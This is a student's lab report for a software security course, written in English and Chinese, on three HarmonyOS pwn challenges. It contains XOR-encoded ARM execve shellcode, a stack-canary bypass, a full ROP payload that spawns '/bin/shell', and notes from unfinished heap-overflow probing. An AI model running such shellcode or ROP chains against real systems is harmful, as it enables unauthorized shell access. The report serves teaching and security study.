<center><font size=7>《软件安全》final</font></center><br /><div align='right'><font size=4><b>陈希尧</b> 3180103012</font></div>

[TOC]

# Lab

## 01_harmshell

### Exploit

Using the modified harmony example which use shell as the boot program:

```shell
OHOS # ls /bin
Directory /bin:
-rwxrwx--- 25828    u:0     g:999   init      
-rwxrwx--- 25824    u:0     g:999   shell     
-rwxrwx--- 50484    u:0     g:999   bundle_daemon
-rwxrwx--- 13540    u:0     g:999   query.bin 
-rwxrwx--- 13440    u:0     g:999   foundation
-rwxrwx--- 13540    u:0     g:999   media_server
-rwxrwx--- 21724    u:0     g:999   appspawn  
-rwxrwx--- 25924    u:0     g:999   wms_server
-rwxrwx--- 13540    u:0     g:999   abilityMain
-rwxrwx--- 13488    u:0     g:999   camera_app
-rwxrwx--- 13792    u:0     g:999   hilogcat  
-rwxrwx--- 13488    u:0     g:999   apphilogcat
```

We can found that the shell is `/bin/shell` instead of `/bin/sh`. So we can modify an existing shellcode's "/bin/sh" to "/bin/shell" and crack the target.

```python
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/sh";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/shell";
```

Then, since the camera_app has use a xor key to decode the payload, we need to encode the shellcode first

```c
void readstring(char *out) {
    char tmp;
    unsigned int i = 0;
    do {
        read(0, &tmp, 1);
        if (tmp == '\n') {
            out[i] = '\x00';
        } else {
            tmp    = tmp ^ key[0];
            out[i] = tmp;
        }
        i++;
    } while (tmp != '\n');
}
```

As we all know, `a ^ key ^ key == a`, so we just do a bit-wide xor to the shellcode:

```python
key = 0xaa
shellcode_xor = b""

for i in shellcode:
    shellcode_xor += (i ^ key).to_bytes(1, 'little')
```

Thus we get the shell.

<img src="assets/image-20210701164736155.png" style="zoom:50%;" />

### Debug

1. harmshell不能用recv而是要用recvuntil，因为鸿蒙启动需要时间，这个时间会超过recv的timeout，因此还没进入camera_app，发送的shellcode是无效的
2. 除此之外，这次的环境不是Linux，使用的是CRLF，因此返回值是"give me something to get shell!\\r\\r\\n"而不是"give me something to get shell!\\n"
3. 不是所有shellcode都是能用的，我尝试的三种shellcode中，只有[Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-696.php)和[Linux/ARM - execve(/bin/sh, [0\], [0 vars]) - 27 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-698.php)是可以的，[Linux/ARM - execve("/bin/sh", NULL, 0) - 34 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-904.php)是无效的，感觉是因为第三个用的是拼接"/bin"和"/sh"的方法，因此改成"/bin/shell"后会出现问题
4. "/etc/flag.exe"会command not found，得先cd再执行

## 02_harmrop

### Stage 1: hijack control flow

Use "arm-linux-gnueabi-objdump" (binutils-arm-gnueabi) to disassemble the binary.

Find the `gift` in the assembly source with the help of `pwn.ELF`

```assembly
1154:	e92d4c1c 	push	{r2, r3, r4, sl, fp, lr}
1158:	e28db010 	add	fp, sp, #16

# printf("[ ] ...look at here");
116c:	e59f0048 	ldr	r0, [pc, #72]	; 11bc <_init-0x228>
1170:	e08f0000 	add	r0, pc, r0
1174:	eb0000b5 	bl	1450 <_fini+0x60>

# execve("/bin/ls\0", 0, 0);
1178:	e59f0040 	ldr	r0, [pc, #64]	; 11c0 <_init-0x224>
117c:	e3a01000 	mov	r1, #0
1180:	e3a02000 	mov	r2, #0
1184:	e08f0000 	add	r0, pc, r0
1188:	eb0000b4 	bl	1460 <_fini+0x70>

# __asm__ __volatile__();
118c:	e8bd000e 	pop	{r1, r2, r3}
1190:	e8bd8031 	pop	{r0, r4, r5, pc}
1194:	e8bd8007 	pop	{r0, r1, r2, pc}
1198:	e24dd010 	sub	sp, sp, #16
119c:	e49df004 	pop	{pc}		; (ldr pc, [sp], #4)
```

And also the `hear`

```assembly
11c4:	e92d4c10 	push	{r4, sl, fp, lr}
11c8:	e28db008 	add	fp, sp, #8
11cc:	e24dd028 	sub	sp, sp, #40	; 0x28
11d0:	e59f403c 	ldr	r4, [pc, #60]	; 1214 <_init-0x1d0>
11d4:	e79f4004 	ldr	r4, [pc, r4]

# puts("[ ] Now Reading:");
11d8:	e5940000 	ldr	r0, [r4]
11dc:	e50b000c 	str	r0, [fp, #-12]
11e0:	e59f0030 	ldr	r0, [pc, #48]	; 1218 <_init-0x1cc>
11e4:	e08f0000 	add	r0, pc, r0
11e8:	eb0000a4 	bl	1480 <_fini+0x90>

# read(STDIN_FILENO, buf, LEN + 0x14);
11ec:	e28d1004 	add	r1, sp, #4
11f0:	e3a00000 	mov	r0, #0
11f4:	e3a02034 	mov	r2, #52	; 0x34
11f8:	eb0000a4 	bl	1490 <_fini+0xa0> 

11fc:	e5940000 	ldr	r0, [r4]
1200:	e51b100c 	ldr	r1, [fp, #-12]
1204:	e0500001 	subs	r0, r0, r1
1208:	024bd008 	subeq	sp, fp, #8
120c:	08bd8c10 	popeq	{r4, sl, fp, pc}
```

Since the canary given is at the position of `smile`, to find the rule of it being held we need to find the functino body of `smile` in the assembly code.

...

But 👆 is toooo diffcult, so I turn to another solution.

Draw the stack struct of hear:

```
High Addr
        hear
 /                \
+------------------+
|      old lr      |
+------------------+
|      old fp      |
+------------------+ <-- fp
|      old sl      |
+------------------+
|      old r4      |
+------------------+ <-- sp + 0x28
|      canary      |
+------------------+
|                  |
|    buf[0:0x20]   |
|                  |
+------------------+ <-- sp + 0x4
 \                /
Low Addr
```

Since the only space left between the `buf` and the saved reg is the one-word space at `sp + 0x24`, and that is the only space that can be used to prevent BOF exploit. So it must be the canary.

So I try by modifying the return address to `printf` in `gift`:

```python
conn.sendline(b"a" * LEN + p32(canary) + b'a' * 12 + p32(gift_addr + printf_binaddr - gift_binaddr))
```

And get the ouput:

```c
// void gift(void) {
//     printf("[ ] ...look at here");
//     execve("/bin/ls\0", 0, 0);

//     __asm__ __volatile__("pop {r1, r2, r3}	\n\t"
//                          "pop {r0, r4, r5, pc}	\n\t"
//                          "pop {r0, r1, r2, pc}	\n\t"
//                          "sub sp, sp, #0x10  \n\t"
//                          "pop {pc} \n\t");

//     return;
// }
    00000030  e1 a2 02 0d  0a 0d 5b 20  5d 20 2e 2e  2e 6c 6f 6f  │····│··[ │] ..│.loo│
    00000040  6b 20 61 74  20 68 65 72  65 5b 45 52  52 5d 4e 6f  │k at│ her│e[ER│R]No│
    00000050  20 73 75 63  68 20 66 69  6c 65 20 6f  72 20 64 69  │ suc│h fi│le o│r di│
    00000060  72 65 63 74  6f 72 79 3a  20 2f 62 69  6e 2f 6c 73  │rect│ory:│ /bi│n/ls│
    00000070  0d 0d 0a 5b  45 52 52 5d  4f 73 56 6d  50 61 67 65  │···[│ERR]│OsVm│Page│
```

This is just what we want.

### Stage 2: "/bin/shell"

Fisrt try finding "shell" in binary using `binary.search(b'shell')` but find nothing. Then I think we can use the payload to have the "/bin/shell" string.

```
High Addr
        hear 
 /                \               subsp
+------------------+       sp--> +----+
|  old lr(subsq)   |             |    |
+------------------+             +----+
|      old fp      |             |    |                               pop3
+------------------+ <--fp       +----+                          +------------+
|      old sl      |             |    |           subsp          |     pc     |
+------------------+             +----+ <--sp--> +----+          +------------+
|      old r4      |             | pc |          |    |          |     r2     |
+------------------+ <--sp+0x28  +----+          +----+          +------------+
|      canary      |                             |    |          |     r1     |
+------------------+                             +----+          +------------+
|                  |                             |    |          | r0(&binsh) |
|    buf[0:0x20]   |                             +----+ <--sp--> +------------+
|                  |                             | pc |
+------------------+ <--sp + 0x4                 +----+ buf[0x18]
 \                /
Low Addr
```

At first I think one `subsp` is enough, but the I found there is a `LEN+0x14` restriction of the read buffer length, so the payload can't exceed `old lr`, there fore we need to `subsp`s.

Then for the `pc` of  `pop {r0, r1, r2, pc}`, I use the real address of "/bin/shell" minus the real address of 0x11e4, since there is a `add	r0, pc, r0` at 0x11e4, we need to sub it first.

As for the computation of sp of `hear`, I use **brutal-force**. Since the stirng "/bin/shell" is wide enough, so I try range `[stack_addr - 0x80, stack_addr + 0x80, 0x8]` to see if any "command not found" hint is printed, and find the correct sp at `stack_addr - 0x40` .

And the fp must be set since execve needs it to maintain stack structure. Here old fp should be `sp + 0x30`.

Thus, the payload is constructed as follows:

```python
payload = b"/bin/shell".ljust(0x18, b'\0')
payload += p32(gift_offset + popr0_binaddr)
payload += p32(sp+4 - (gift_offset + addr0pc_binaddr))  # r0 of execve
payload += p32(canary)
payload += p32(gift_offset + subsp_binaddr)        # r4 = second subsq
payload += p32(gift_offset + execve_nor0_binaddr)  # sl = execve_nor0
payload += p32(sp + 0x30)                          # correct fp
payload += p32(gift_offset + subsp_binaddr)        # lr = first subsp
```

And get shell:

<img src="assets/image-20210702200322591.png" style="zoom:50%;" />

### Debug

1. 一开始想获得hear的sp是用gdb获得的sp减去同一次运行时的prepare输出获得offset。后来发现因为没设断点，所以gdb输出的sp是read函数的不是hear函数的，因此改成用推算的
2. 为什么要用两个sub：因为只用一个的话`(&execve_nor0)`要存到old lr上面去，这样超出了read的buffer大小的限制
3. 为什么要以0x117c作为执行execve的入口：这样既能保证execve的r1和r2参数都是0，也能保证r0能被我修改
    * 题目给`pop {r0, r1, r2, pc}`这个gadget的本意可能要让我们把r0、r1、r2都用pop的方式填写然后直接调用`bl execve`但是这样实在太麻烦了
4. fp不能不改，不如execve出问题了程序照样崩溃
5. 本来改了subsp的canary，后来发现不需要也没问题，猜测程序检查canary是靠`__stack_chk_fail`的，直接用pop pc跳转的话不需要保持canary

## 03_harmheap

### Stage 1: find vulnerability

稍微尝试了一下发现，新建DDL的时候的size是规定了某个大小，并且在size较小时name或content稍大一点程序就会直接崩溃，但是具体的规律并不明显。

进行以下测试：

* size=1，\#name=1, \#content=1不会爆
* size=1，\#name=2, \#content=1不会爆
* size=1，\#name=1, \#content=2会爆
* size=1，\#name=7, \#content=1不会爆
* size=1，\#name=8, \#content=1会爆
* size=1，\#name=7, \#content=2会爆

由此可知程序会先利用`size`来从heap里分配一块空间给DDL，然后再用这块空间进行写操作，此处就会存在overflow的漏洞。但是这个漏洞并不能让程序崩溃（不显示鸿蒙的log），而只是进入了一个打印"Your choice: !!! invalid choice !!!"的死循环。

在此基础上，我觉得仍应使用hw4中的方法。经尝试，UAF是不能用的，因为edit能修改已结束的DDL的bug已经被修复了。所以应该是unsafe unlink。

### Stage 2: crash program

首先尝试使用UAF的方法去修改GOT表，但是鸿蒙中似乎没有这种GOT表的数据结构。

不会写。

# Appendix

## Reference

[Linux/ARM - execve(/bin/sh, [0\], [0 vars]) - 27 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-698.php)

[c - objdump: Can't use supplied machine MIPS - Stack Overflow](https://stackoverflow.com/questions/35498355/objdump-cant-use-supplied-machine-mips)

[ARM Instruction Set (iitd-plos.github.io)](https://iitd-plos.github.io/col718/ref/arm-instructionset.pdf)

[ARM Developer Suite Assembler Guide](https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP)

[What `andcs` and `andeq` instructions mean? : embedded (reddit.com)](https://www.reddit.com/r/embedded/comments/la3pcm/what_andcs_and_andeq_instructions_mean/)

[malloc\src - musl - musl - an implementation of the standard library for Linux-based systems (musl-libc.org)](https://git.musl-libc.org/cgit/musl/tree/src/malloc)

